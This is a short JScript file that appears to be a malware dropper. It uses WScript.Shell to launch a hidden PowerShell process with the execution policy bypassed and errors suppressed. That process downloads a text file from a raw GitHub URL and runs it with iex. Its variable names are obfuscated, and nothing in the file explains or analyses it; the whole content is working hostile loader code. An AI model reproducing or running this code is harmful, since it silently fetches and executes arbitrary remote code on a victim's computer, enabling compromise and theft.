var yes, omhyt, orkekrex;

yes = "https://raw.githubusercontent.com/bhh545578-lab/gg1z1/main/uploaded/juju123.txt";

orkekrex = new ActiveXObject("WScript.Shell");

omhyt = "powershell.exe -NoLogo -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command " +
        "\"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" +
        "$ProgressPreference='SilentlyContinue';" +
        "$ErrorActionPreference='SilentlyContinue';" +
        "iex((New-Object Net.WebClient).DownloadString('" + yes + "'))\"";

orkekrex.Run(omhyt, 0, false);

orkekrex = null;
